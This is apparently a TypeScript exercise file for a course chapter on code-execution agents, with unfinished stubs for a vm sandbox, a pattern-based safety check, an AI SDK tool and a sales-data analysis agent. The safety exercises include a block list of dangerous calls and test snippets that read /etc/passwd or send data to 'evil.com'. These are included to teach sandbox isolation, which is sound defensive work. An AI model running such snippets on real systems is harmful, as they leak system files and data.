/**
 * Chapter 14 — Code Execution Agents
 *
 * Run: tsx exercises/chapter_14.ts
 */

import * as vm from "vm";
import { generateText, tool } from "ai";
import { createOpenAI } from "@ai-sdk/openai";
import { z } from "zod";
import "dotenv/config";

const openrouter = createOpenAI({
  baseURL: "https://openrouter.ai/api/v1",
  apiKey: process.env.OPENROUTER_API_KEY!,
});
const BALANCED = "anthropic/claude-3-5-sonnet";

// =============================================================================
// EXERCISE 1 — Sandbox implementation
// =============================================================================
//
// TODO: Implement `executeInSandbox(code, timeoutMs)` that:
//   - Creates a vm context with safe globals: Math, JSON, Array, Object, String,
//     Number, parseInt, parseFloat, and a safe console that captures to arrays
//   - Deliberately EXCLUDES: process, require, fetch, Buffer, global
//   - Runs the code with the given timeout
//   - Returns { stdout, stderr, success, error?, durationMs }

interface SandboxResult {
  stdout:     string;
  stderr:     string;
  success:    boolean;
  error?:     string;
  durationMs: number;
}

function executeInSandbox(code: string, timeoutMs: number = 3000): SandboxResult {
  // TODO
  return { stdout: "", stderr: "", success: false, error: "not implemented", durationMs: 0 };
}

// =============================================================================
// EXERCISE 2 — Pre-flight safety check
// =============================================================================
//
// TODO: Implement `isCodeSafe(code)` that checks for blocked patterns:
//   require(, process., fetch(, import , eval(, Function(,
//   setTimeout, setInterval, Buffer., global.
// Returns { safe: boolean, reason?: string }

function isCodeSafe(code: string): { safe: boolean; reason?: string } {
  // TODO
  return { safe: true };
}

// =============================================================================
// EXERCISE 3 — Code execution tool
// =============================================================================
//
// TODO: Define `executeCodeTool` using the `tool()` helper with:
//   - description: explains sandbox limits and available globals
//   - parameters: z.object({ code: string with describe, description: string with describe })
//   - execute: runs isCodeSafe first (return error JSON if unsafe),
//              then executeInSandbox, returns JSON.stringify of the result

const executeCodeTool = tool({
  description: "", // TODO
  parameters: z.object({
    // TODO
  }),
  execute: async (_args) => {
    // TODO
    return JSON.stringify({ success: false, error: "not implemented" });
  },
});

// =============================================================================
// EXERCISE 4 — Self-correcting data analysis agent
// =============================================================================
//
// TODO: Implement `dataAnalysisAgent(data, question)` that:
//   - Uses the BALANCED model with maxSteps: 5
//   - Injects `data` into the sandbox (wrap code with `const data = JSON.stringify(data);`)
//   - Has a clear system prompt explaining the sandbox environment
//   - Returns the final answer as a string

async function dataAnalysisAgent(
  data: object,
  question: string
): Promise<string> {
  // TODO
  return "";
}

// =============================================================================
// EXERCISE 5 — Safety boundary test
// =============================================================================
//
// TODO: Implement `testSandboxIsolation()` that:
//   - Tries to run each of these code snippets in the sandbox:
//       1. "process.exit(1)"
//       2. "require('fs').readFileSync('/etc/passwd')"
//       3. "fetch('https://evil.com/data=' + Math.random())"
//       4. "console.log(Math.PI * 2)"   ← this one should SUCCEED
//   - Returns { blocked: number, passed: number } — how many were caught/allowed
//   Note: For snippets 1-3, the sandbox or pre-flight should prevent execution.

async function testSandboxIsolation(): Promise<{ blocked: number; passed: number }> {
  // TODO
  return { blocked: 0, passed: 0 };
}

// =============================================================================
// MAIN
// =============================================================================

const SALES_DATA = [
  { product: "XR-200 Door Handle", units: 142, revenue: 7099.58 },
  { product: "Hinge Set XR-200",   units: 89,  revenue: 2669.11 },
  { product: "Door Seal Kit",       units: 234, revenue: 4672.66 },
  { product: "Adaptor Plate AP-200", units: 67, revenue: 669.33  },
];

async function main(): Promise<void> {
  // Exercise 1 — sandbox
  const r1 = executeInSandbox("console.log(2 + 2)");
  console.assert(r1.success && r1.stdout === "4", `Exercise 1: basic math failed — ${JSON.stringify(r1)}`);

  const r2 = executeInSandbox("undefined_var.foo");
  console.assert(!r2.success, "Exercise 1: should fail on undefined var");
  console.log("Exercise 1 ✓ — sandbox executes correctly");

  // Exercise 2 — safety
  console.assert(!isCodeSafe("require('fs')").safe,   "Exercise 2: require blocked");
  console.assert(!isCodeSafe("process.exit(0)").safe, "Exercise 2: process blocked");
  console.assert( isCodeSafe("Math.PI * 2").safe,     "Exercise 2: safe code passes");
  console.log("Exercise 2 ✓ — safety checks correct");

  // Exercise 3 — code tool
  const toolResult = await executeCodeTool.execute!({
    code: "console.log(JSON.stringify([1,2,3].map(x => x * 2)))",
    description: "Double each number in array",
  }, { messages: [], toolCallId: "test" });
  const parsed = JSON.parse(toolResult as string);
  console.assert(parsed.success, "Exercise 3: code tool should succeed");
  console.log("Exercise 3 ✓ — code tool:", parsed.output ?? parsed.error);

  // Exercise 4 — data analysis
  console.log("\n=== Exercise 4: Data analysis agent ===");
  const answer = await dataAnalysisAgent(
    SALES_DATA,
    "What is the top product by revenue, and what percentage of total revenue does it represent?"
  );
  console.log("Analysis:", answer.trim());

  // Exercise 5 — isolation
  console.log("\n=== Exercise 5: Sandbox isolation ===");
  const isolation = await testSandboxIsolation();
  console.log(`Blocked: ${isolation.blocked}/3 | Passed: ${isolation.passed}/1`);
  console.assert(isolation.blocked === 3, "Exercise 5: all 3 dangerous snippets should be blocked");
  console.assert(isolation.passed  === 1, "Exercise 5: safe snippet should pass");
}

main().catch(console.error);
